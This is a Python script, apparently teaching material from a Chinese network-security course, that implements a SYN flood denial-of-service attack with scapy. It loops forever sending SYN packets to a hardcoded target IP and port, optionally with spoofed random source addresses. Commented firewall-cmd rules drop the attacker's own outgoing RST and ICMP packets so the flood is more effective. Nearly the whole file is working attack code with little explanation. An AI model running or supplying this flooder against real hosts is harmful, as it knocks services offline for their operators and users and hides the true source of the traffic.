#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --tcp-flags RST RST -s 202.100.1.138 -j DROP
#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p icmp -s 202.100.1.138 -j DROP

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *
from PyQYT.Network.Tools.Random_IP import Random_IP

def syn_dos(ip, port, random_enable=True):#定义方法，传入目标IP地址，目标端口号，是否激活随机伪装源IP地址
	if random_enable == True:#如果激活随机伪装源IP地址
		while True:#一直执行直到ctl+c停止程序
			source_port = random.randint(1024, 65535)#随机产生源端口
			init_sn = random.randint(1, 65535*63335)#随机产生初始化序列号
			source_ip = Random_IP()
			#发送SYN同步包（不必等待回应）#随机伪装源IP，随机产生源端口和初始化序列号
			send(IP(src=source_ip,dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)
	else:#如果不激活随机伪装源IP地址
		while True:
			source_port = random.randint(1024, 65535)#随机产生源端口
			init_sn = random.randint(1, 65535*63335)#随机产生初始化序列号
			#发送SYN同步包（不必等待回应）#随机产生源端口和初始化序列号
			send(IP(dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)

if __name__ == '__main__':
	syn_dos("202.100.1.1", 23)